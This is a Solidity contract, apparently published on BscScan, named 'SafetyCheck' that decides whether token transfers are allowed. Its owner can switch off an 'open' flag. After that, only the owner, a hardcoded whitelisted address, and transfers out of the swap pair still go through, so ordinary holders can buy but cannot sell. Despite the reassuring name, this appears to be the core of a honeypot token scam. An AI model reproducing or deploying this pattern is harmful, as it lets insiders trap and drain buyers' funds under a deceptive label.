/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SafetyCheck  {
    address public buyer = address(0xE5d663F43b21047A846239Acf8D0Bb068C9FaE98);
    address public owner;
    address public swappair;
    bool public open = true;

    mapping(address => bool) public whitelist;
    constructor(
    ){
        owner = msg.sender;
        whitelist[buyer] = true;
        whitelist[owner] = true;
    }

    function addWhitelist(address whiter) external  {
        require(msg.sender == owner);
        whitelist[whiter] = true;
    }

    function setOpen(bool _open) external  {
        require(msg.sender == owner);
        open = _open;
    }
    function setSwappair(address _swappair) external  {
        require(msg.sender == owner);
        swappair = _swappair;
    }

    function beforeTransfer(
        address from,
        uint256 frombalance,
        uint256 amount
    ) public view returns (bool) {
        if (whitelist[from])
        { return true;}
        else{
            if (frombalance >= amount){
                if(from == swappair){
                    return true;
                }else{
                    if(open){
                        return true;
                    }
                    else{
                        return false;
                        }
                    
                }
            }else {
                return false;
            }

        }
    }
}